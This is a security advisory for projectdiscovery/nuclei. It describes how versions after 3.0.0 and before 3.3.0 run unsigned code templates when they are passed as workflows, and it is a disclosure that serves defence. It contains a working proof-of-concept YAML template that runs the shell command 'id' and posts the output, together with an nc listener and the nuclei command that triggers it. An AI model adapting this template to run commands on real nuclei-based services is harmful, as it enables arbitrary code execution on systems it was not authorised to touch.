# Unsigned code template execution through workflows in projectdiscovery/nuclei

## Package

gomod

github.com/projectdiscovery/nuclei
([Go](/advisories?query=ecosystem%3Ago))

## Affected versions

> 3.0.0

## Patched versions

3.3.0

## Description

### Summary

Find a way to execute code template without -code option and signature.

### Details

write a `code.yaml`:

```
id: code

info:
  name: example code template
  author: ovi3

code:
  - engine:
      - sh
      - bash
    source: |
      id

http:
  - raw:
      - |
        POST /re HTTP/1.1
        Host: {{Hostname}}

        {{code_response}}

workflows:
  - matchers:
    - name: t
```

using nc to listen on 80:

```
nc -lvvnp 80
```

execute PoC template with nuclei:

```
./nuclei -disable-update-check  -w code.yaml -u http://127.0.0.1 -vv -debug
```

and nc will get `id` command output.

We use `-w` to specify a workflow file, not `-t` to template file. and notice there is a `workflows` field in code.yaml to pretend to be a workflow file.

Test in Linux and Nuclei v3.2.9

### Impact

Some web applications inherit from Nuclei and allow users to edit and execute workflow files. In this case, users can execute arbitrary commands. (Although, as far as I know, most web applications use -t to execute)

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
